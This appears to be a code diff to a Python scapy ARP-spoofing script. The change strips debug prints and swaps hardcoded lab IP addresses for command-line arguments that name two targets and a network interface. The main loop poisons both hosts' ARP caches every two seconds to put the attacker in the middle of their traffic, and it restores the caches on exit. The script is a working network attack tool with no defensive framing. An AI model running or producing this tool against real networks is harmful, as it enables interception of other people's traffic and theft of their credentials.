@@ -1,11 +1,10 @@
 from scapy.all import Ether, ARP, sendp, get_if_hwaddr, srp
 import time
 import sys
+import argparse
 
 def get_mac(ip):
     ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=2, verbose=False)
-    print(ans)
-    print(ans[0][1].hwsrc)
     if ans:
         return ans[0][1].hwsrc
     else:
@@ -27,21 +26,29 @@ def restore(destination_ip, source_ip, interface):
     sendp(packet, count=4, iface=interface, verbose=0)
 
 if __name__ == "__main__":
-    iface = "eth0"  
-    nano1_ip = "192.168.1.16"
-    agx1_ip = "192.168.1.23"
     
+    parser = argparse.ArgumentParser(description='ARP Spoofer')
+    parser.add_argument('target1', help='IP of first target')
+    parser.add_argument('target2', help='IP of second target')
+    parser.add_argument('-i', '--interface', default='eth0',
+                       help='Network interface (default: eth0)')
+    
+    args = parser.parse_args()
+    
+    src_ip = args.target1
+    dst_ip = args.target2
+    iface = args.interface
     try:
-        print("[*] Starting ARP spoofing attack")
+        print(f"[*] Starting ARP spoofing attack between {args.target1} and {args.target2}")
         while True:
-            spoof(nano1_ip, agx1_ip, iface)
-            spoof(agx1_ip, nano1_ip, iface)
+            spoof(src_ip, dst_ip, iface)
+            spoof(dst_ip, src_ip, iface)
             time.sleep(2)
             
     except KeyboardInterrupt:
         print("\n[*] Restoring ARP tables")
-        restore(nano1_ip, agx1_ip, iface)
-        restore(agx1_ip, nano1_ip, iface)
+        restore(src_ip, dst_ip, iface)
+        restore(dst_ip, src_ip, iface)
         sys.exit(0)
 
 
